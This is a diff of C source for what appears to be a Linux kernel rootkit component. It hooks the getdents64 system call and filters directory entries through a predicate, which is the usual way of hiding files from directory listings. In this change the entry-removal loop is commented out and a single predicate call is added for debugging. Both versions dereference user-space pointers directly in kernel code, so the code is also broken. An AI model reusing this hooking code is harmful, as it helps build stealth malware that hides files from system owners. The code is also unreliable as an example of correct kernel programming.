@@ -54,19 +54,20 @@ asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 __user *dir
 	return filter_out64(dirp, length, &filter_fn64);
 }
 
-static inline int filter_out(struct linux_dirent *dirp, int length, int (*pred)(struct linux_dirent)) {
+static inline int filter_out(struct linux_dirent __user *dirp, int length, int (*pred)(struct linux_dirent)) {
 	int index = 0;
 	int index_copyto = -1;
 	unsigned short reclen;
 	struct linux_dirent d;
 	// Why ints? Because getdents[64] returns an int.
+	pred(*dirp);
 	
-	while (index < length) {
+	/*while (index < length) {
 		d = *(dirp+index);
 		reclen = d.d_reclen;
 		pred(d);
 		
-		/*if (!pred(d)) {
+		if (!pred(d)) {
 			length -= reclen;
 			
 			if (index_copyto != -1) {
@@ -75,27 +76,28 @@ static inline int filter_out(struct linux_dirent *dirp, int length, int (*pred)(
 		} else if (index_copyto != -1 && index_copyto != index) {
 			memmove(dirp+index_copyto, dirp+index, reclen);
 			index_copyto += reclen;
-		}*/
+		}
 		
 		index += reclen;
-	}
+	}*/
 	
 	return length;
 }
 
-static inline int filter_out64(struct linux_dirent64 *dirp, int length, int (*pred)(struct linux_dirent64)) {
+static inline int filter_out64(struct linux_dirent64 __user *dirp, int length, int (*pred)(struct linux_dirent64)) {
 	int index = 0;
 	int index_copyto = -1;
 	unsigned short reclen;
 	struct linux_dirent64 d;
 	// Why ints? Because getdents[64] returns an int.
+	pred(*dirp);
 	
-	while (index < length) {
+	/*while (index < length) {
 		d = *(dirp+index);
 		reclen = d.d_reclen;
 		pred(d);
 		
-		/*if (!pred(d)) {
+		if (!pred(d)) {
 			length -= reclen;
 			
 			if (index_copyto != -1) {
@@ -104,10 +106,10 @@ static inline int filter_out64(struct linux_dirent64 *dirp, int length, int (*pr
 		} else if (index_copyto != -1 && index_copyto != index) {
 			memmove(dirp+index_copyto, dirp+index, reclen);
 			index_copyto += reclen;
-		}*/
+		}
 		
 		index += reclen;
-	}
+	}*/
 	
 	return length;
 }
